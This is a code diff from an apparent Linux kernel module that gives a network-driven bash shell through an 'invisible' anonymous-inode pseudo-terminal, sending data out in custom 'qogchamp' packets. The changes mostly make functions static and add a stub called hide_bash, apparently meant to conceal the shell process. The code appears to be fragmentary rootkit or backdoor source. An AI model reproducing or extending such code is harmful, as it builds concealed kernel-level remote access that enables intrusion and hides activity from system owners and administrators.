@@ -41,7 +41,7 @@ struct command* cur_command = NULL; //the command we are currently processing
 
 #define WRITE_SIZE 1024 //how big the data payload is for each qogchamp skb. This is tunable.   
 
-ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){ //qtty writes in blocks of 1024 bytes so as to prevent any MTU issues
+static ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){ //qtty writes in blocks of 1024 bytes so as to prevent any MTU issues
 
   //fragmentation into MTU sized blocks should happen here. 
    // printk(KERN_INFO "WRITING\n");
@@ -84,13 +84,13 @@ ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t*
 }
 
 
-int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
+static int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
     //nop. We should never reach this function because we are opened as an anon inode.
     return 0;
 }
 
 
-void wait_read(void){ //wait for a command to be added to
+static void wait_read(void){ //wait for a command to be added to
 
   unsigned long flags;
   unsigned int state = TASK_KILLABLE;
@@ -124,7 +124,7 @@ void wait_read(void){ //wait for a command to be added to
   
 }
 
-ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){ //bash calls this when reading from "stdin"
+static ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){ //bash calls this when reading from "stdin"
   
   unsigned long flags;
 
@@ -211,7 +211,12 @@ const struct file_operations qtty_fops = {
 
 DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for bash_proc to be populated
 
-
+static void hide_bash(void){
+  if(!bash_proc){
+    printk(KERN_INFO "bash_proc is NULL\n");
+    
+  }
+}
 
 static int init_func(struct subprocess_info* info, struct cred* new){ //TODO: change current working directory
   int retval; 
